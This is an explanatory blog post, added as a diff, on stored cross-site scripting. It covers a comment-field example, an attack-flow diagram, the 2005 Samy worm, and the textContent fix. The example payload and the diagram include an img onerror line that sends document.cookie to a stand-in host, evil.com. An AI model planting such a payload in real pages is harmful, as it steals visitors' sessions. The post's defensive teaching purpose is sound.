@@ -1,0 +1,247 @@
+---
+title: "When Text Becomes Code"
+publishedAt: "2026.05.18"
+summary: "XSS became much clearer to me once I stopped thinking about bad strings and started thinking about when text gets interpreted as HTML."
+---
+# When Text Becomes Code
+
+It took me longer than I would like to admit to understand XSS properly.
+
+At first, the phrase itself felt abstract. Cross-Site Scripting. It sounded like one of those security terms you are supposed to fear before you really understand it. I knew it was bad. I knew `innerHTML` was suspicious. I knew people said “never trust user input.” But I did not yet have the right picture in my head.
+
+The first useful definition I found for myself was this:
+
+**XSS is when untrusted input gets executed as code in the browser of a trusted site.**
+
+Not merely displayed. Executed.
+
+That distinction matters, because otherwise XSS can sound deceptively similar to ordinary HTML injection. Someone makes the page look weird. A button turns red. A fake heading appears. Bad, yes. But still cosmetic.
+
+XSS is different. XSS means the attacker’s input stops being content and starts becoming behavior.
+
+And for me, the simplest way to see that was through stored XSS.
+
+## A Concrete Example
+
+Imagine a blog with comments.
+
+The attacker writes a comment like this:
+
+```html
+<img src=x onerror="fetch('https://evil.com/steal?c=' + document.cookie)">
+```
+
+Then they hit submit and walk away.
+
+That is step one. Their job is already done.
+
+Step two is quieter. The server stores the comment exactly as typed. No sanitization. No escaping. The payload now lives in the database like any other row.
+
+Step three is where the real problem begins. A normal visitor opens the blog post. The server reads the stored comment from the database and sends it back to the page. If the frontend renders it with something like:
+
+```js
+body.innerHTML = comment.text
+```
+
+then the browser does not see “a string that happens to contain angle brackets.” It sees HTML. It builds a real `<img>` element. The image load fails because `src=x` is invalid. The `onerror` handler fires. A request silently goes out to `evil.com` carrying whatever data the script is trying to steal.
+
+The visitor sees nothing unusual.
+
+Step four is the part that made the whole thing click for me. The attacker checks the logs on their own server, finds the stolen cookie or token, and uses it to impersonate the victim. No password prompt. No phishing email. No obvious sign that anything happened.
+
+That is not fake content anymore. That is code execution.
+
+And that is why XSS feels more serious than the name suggests. The browser is not just showing attacker input. It is running attacker instructions inside your site’s trust boundary.
+
+<svg width="100%" viewBox="0 0 680 510" role="img" xmlns="http://www.w3.org/2000/svg" fontFamily="inherit">
+  <title>How stored XSS reaches other users — attack flow</title>
+  <desc>Four-step flow: attacker posts payload, server stores it, any visitor's browser executes it, attacker steals session cookies</desc>
+  <defs>
+    <marker id="xss-arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+      <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
+    </marker>
+  </defs>
+
+  <text x="340" y="28" textAnchor="middle" fill="#8c95a1" fontSize="12">step 1 — attacker posts the payload once</text>
+
+  <rect x="30" y="40" width="110" height="56" rx="8" fill="#fef2f2" stroke="#b33535" strokeWidth="0.5"/>
+  <text x="85" y="60" textAnchor="middle" dominantBaseline="central" fill="#7f1d1d" fontSize="14" fontWeight="500">Attacker</text>
+  <text x="85" y="78" textAnchor="middle" dominantBaseline="central" fill="#b33535" fontSize="12">posts comment</text>
+
+  <line x1="140" y1="68" x2="164" y2="68" stroke="#8c95a1" strokeWidth="1.5" markerEnd="url(#xss-arrow)"/>
+
+  <rect x="166" y="40" width="288" height="56" rx="8" fill="none" stroke="#b33535" strokeWidth="0.5" strokeDasharray="4 3"/>
+  <text x="182" y="59" dominantBaseline="central" fontFamily="monospace" fontSize="12" fill="#7f2828">&lt;img src=x</text>
+  <text x="182" y="77" dominantBaseline="central" fontFamily="monospace" fontSize="12" fill="#7f2828">  onerror="steal(document.cookie)"&gt;</text>
+
+  <line x1="454" y1="68" x2="486" y2="68" stroke="#8c95a1" strokeWidth="1.5" markerEnd="url(#xss-arrow)"/>
+
+  <rect x="488" y="40" width="152" height="56" rx="8" fill="#ebedef" stroke="#8c95a1" strokeWidth="0.5"/>
+  <text x="564" y="60" textAnchor="middle" dominantBaseline="central" fill="#3b4149" fontSize="14" fontWeight="500">Server + DB</text>
+  <text x="564" y="78" textAnchor="middle" dominantBaseline="central" fill="#697381" fontSize="12">stores raw, no escape</text>
+
+  <line x1="30" y1="118" x2="650" y2="118" stroke="#d8dbdf" strokeWidth="0.5" strokeDasharray="4 3"/>
+  <text x="340" y="136" textAnchor="middle" fill="#8c95a1" fontSize="12">step 2 — any visitor who opens the page is now a victim</text>
+
+  <rect x="30" y="150" width="110" height="56" rx="8" fill="#edf7f2" stroke="#1a7a52" strokeWidth="0.5"/>
+  <text x="85" y="170" textAnchor="middle" dominantBaseline="central" fill="#0f4f3d" fontSize="14" fontWeight="500">Any visitor</text>
+  <text x="85" y="188" textAnchor="middle" dominantBaseline="central" fill="#1a7a52" fontSize="12">opens the blog</text>
+
+  <line x1="140" y1="178" x2="234" y2="178" stroke="#8c95a1" strokeWidth="1.5" markerEnd="url(#xss-arrow)"/>
+
+  <rect x="236" y="150" width="140" height="56" rx="8" fill="#ebedef" stroke="#8c95a1" strokeWidth="0.5"/>
+  <text x="306" y="170" textAnchor="middle" dominantBaseline="central" fill="#3b4149" fontSize="14" fontWeight="500">Server</text>
+  <text x="306" y="188" textAnchor="middle" dominantBaseline="central" fill="#697381" fontSize="12">fetches from DB</text>
+
+  <text x="424" y="168" textAnchor="middle" fill="#697381" fontSize="12">HTML + payload inside</text>
+  <line x1="376" y1="178" x2="474" y2="178" stroke="#b33535" strokeWidth="1.5" markerEnd="url(#xss-arrow)"/>
+
+  <rect x="476" y="150" width="154" height="56" rx="8" fill="#edf7f2" stroke="#1a7a52" strokeWidth="0.5"/>
+  <text x="553" y="170" textAnchor="middle" dominantBaseline="central" fill="#0f4f3d" fontSize="14" fontWeight="500">Browser</text>
+  <text x="553" y="188" textAnchor="middle" dominantBaseline="central" fill="#1a7a52" fontSize="12">parses the HTML</text>
+
+  <line x1="30" y1="228" x2="650" y2="228" stroke="#d8dbdf" strokeWidth="0.5" strokeDasharray="4 3"/>
+  <text x="340" y="246" textAnchor="middle" fill="#8c95a1" fontSize="12">step 3 — script fires automatically. victim sees nothing unusual.</text>
+
+  <rect x="30" y="260" width="130" height="56" rx="8" fill="#edf7f2" stroke="#1a7a52" strokeWidth="0.5"/>
+  <text x="95" y="280" textAnchor="middle" dominantBaseline="central" fill="#0f4f3d" fontSize="14" fontWeight="500">img onerror</text>
+  <text x="95" y="298" textAnchor="middle" dominantBaseline="central" fill="#1a7a52" fontSize="12">fires silently</text>
+
+  <line x1="160" y1="288" x2="194" y2="288" stroke="#8c95a1" strokeWidth="1.5" markerEnd="url(#xss-arrow)"/>
+
+  <rect x="196" y="260" width="240" height="56" rx="8" fill="#fef2f2" stroke="#b33535" strokeWidth="0.5"/>
+  <text x="212" y="279" dominantBaseline="central" fontFamily="monospace" fontSize="12" fill="#7f2828">fetch('evil.com/steal?c='</text>
+  <text x="212" y="297" dominantBaseline="central" fontFamily="monospace" fontSize="12" fill="#7f2828">  + document.cookie)</text>
+
+  <line x1="436" y1="288" x2="492" y2="288" stroke="#b33535" strokeWidth="1.5" markerEnd="url(#xss-arrow)"/>
+
+  <rect x="494" y="260" width="146" height="56" rx="8" fill="#fef2f2" stroke="#b33535" strokeWidth="0.5"/>
+  <text x="567" y="280" textAnchor="middle" dominantBaseline="central" fill="#7f1d1d" fontSize="14" fontWeight="500">evil.com</text>
+  <text x="567" y="298" textAnchor="middle" dominantBaseline="central" fill="#b33535" fontSize="12">receives cookies</text>
+
+  <line x1="30" y1="338" x2="650" y2="338" stroke="#d8dbdf" strokeWidth="0.5" strokeDasharray="4 3"/>
+  <text x="340" y="356" textAnchor="middle" fill="#8c95a1" fontSize="12">step 4 — attacker uses the cookie to log in as the victim</text>
+
+  <rect x="30" y="370" width="406" height="44" rx="8" fill="none" stroke="#b33535" strokeWidth="0.5" strokeDasharray="4 3"/>
+  <text x="46" y="386" dominantBaseline="central" fontFamily="monospace" fontSize="12" fill="#7f2828">session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4...</text>
+  <text x="46" y="404" dominantBaseline="central" fill="#697381" fontSize="12">(victim's session cookie — stolen silently, no click needed)</text>
+
+  <line x1="436" y1="392" x2="488" y2="392" stroke="#b33535" strokeWidth="1.5" markerEnd="url(#xss-arrow)"/>
+
+  <rect x="490" y="370" width="150" height="44" rx="8" fill="#fef2f2" stroke="#b33535" strokeWidth="0.5"/>
+  <text x="565" y="386" textAnchor="middle" dominantBaseline="central" fill="#7f1d1d" fontSize="14" fontWeight="500">Attacker</text>
+  <text x="565" y="404" textAnchor="middle" dominantBaseline="central" fill="#b33535" fontSize="12">logs in as victim</text>
+
+  <rect x="30" y="434" width="620" height="56" rx="8" fill="#fefcf0" stroke="#9a7020" strokeWidth="0.5"/>
+  <text x="46" y="452" dominantBaseline="central" fill="#5a4010" fontSize="12" fontWeight="500">XSS vs HTML injection:</text>
+  <text x="46" y="468" dominantBaseline="central" fill="#5a4010" fontSize="12">HTML injection fools the eye — it injects fake content. XSS executes real code — it owns the browser.</text>
+  <text x="46" y="482" dominantBaseline="central" fill="#5a4010" fontSize="12">One is a costume. The other hands the attacker the keys.</text>
+</svg>
+
+## A Real Incident: The Samy Worm (2005)
+
+This is not a hypothetical.
+
+In October 2005, Samy Kamkar — then 19 years old — discovered that MySpace allowed limited HTML in profile pages but tried to block `<script>` tags. He found that MySpace’s sanitizer had gaps: CSS `expression()` in Internet Explorer, certain event handlers on elements, and attribute tricks the filter did not anticipate.
+
+He crafted a payload that did three things when anyone viewed his profile:
+
+1. Added Samy as a friend on MySpace.
+2. Copied the worm to the viewer’s own profile.
+3. Added the phrase "but most of all, samy is my hero" to their page.
+
+The mechanics map exactly onto the stored XSS model above. Samy posted once. The server stored his profile. Every subsequent visitor triggered the payload — and became a new carrier.
+
+Within about 20 hours, over one million MySpace profiles had been modified. MySpace had to take the site offline to stop it.
+
+The worm did not steal session cookies — it spread itself. But the execution model is identical: untrusted input, stored without sanitization, rendered in an HTML context, and run. The only difference from cookie theft is what the payload chose to do once it had the browser’s ear.
+
+Samy later published a full technical breakdown of the payload. It is worth reading if you want to see what filter evasion actually looks like in practice. The trick was never finding a magic character. It was always finding one renderer that would interpret the string as HTML.
+
+## The Misleading Intuition
+
+What confused me for a while was that the danger appears to begin at the input field.
+
+A user types something suspicious. The backend stores it. The database now contains a payload. It feels as if the text itself has become poisonous.
+
+But that is not really what is happening.
+
+In storage, `<img src=x onerror="alert(1)">` is just a string. In JSON, it is just a string. Moving through the backend, it is still just a string. The dangerous moment arrives only when some renderer crosses a boundary and says: _interpret this as HTML_. That is when the browser stops seeing text and starts building DOM.
+
+That small shift in perspective clarified almost everything for me.
+
+This is why the frontend fix can feel almost magical when you first see it.
+
+```js
+body.innerHTML = comment.text
+```
+
+becomes
+
+```js
+body.textContent = comment.text
+```
+
+The data has not changed. The database row has not changed. The API response has not changed. What changed is the instruction we give the browser.
+
+One says: parse this.
+The other says: display this.
+
+That is the whole bug.
+
+## Plain Text Is a Real Product Policy
+
+This also cleared up another confusion for me. When people say “fix it in the backend,” the first instinct is often to reject `<` and `>` or strip anything that looks like HTML.
+
+That can reduce risk, but it also mixes up security policy with product policy.
+
+If comments are meant to be plain text, then users should still be allowed to write things like:
+
+```txt
+Use <div> here
+if (a < b)
+```
+
+Especially on a technical blog, those are completely normal comments. There is nothing inherently malicious about angle brackets. The problem is not the character. The problem is the interpretation.
+
+So for a plain-text comment system, the model I now prefer is very simple:
+
+- accept text as text
+- store text as text
+- render text as text
+
+That is it.
+
+The backend can still validate emptiness, length, rate limits, and all the usual product rules. But it does not need to panic every time it sees `<script>` in a comment. The real requirement is stricter and more precise: every place that renders comments must render them in a text context, not an HTML context.
+
+## Why I No Longer Love Escaping on Write
+
+You can also escape HTML in the backend before storing it:
+
+```js
+function escapeHTML(str) {
+  return str
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+}
+```
+
+And yes, that can work.
+
+But for a plain-text system, it now feels like preserving the wrong thing. The database no longer contains the original comment. It contains one HTML-specific encoding of that comment. That may be acceptable in some systems, but it also entangles storage with presentation.
+
+I find the more boring model cleaner: keep the original text, and make each output context responsible for handling it correctly.
+
+## Final Thought
+
+The more I think about bugs like this, the more I suspect many of them survive because we describe them too vaguely.
+
+“Don’t trust user input” is directionally correct, but it is not operationally sharp enough.
+
+What I needed was something more precise:
+
+**Do not hand untrusted text to an HTML parser unless you have an explicit reason and a real sanitization policy.**
+
+Once I saw XSS as a problem of interpretation rather than a problem of evil strings, a lot of things became simpler.
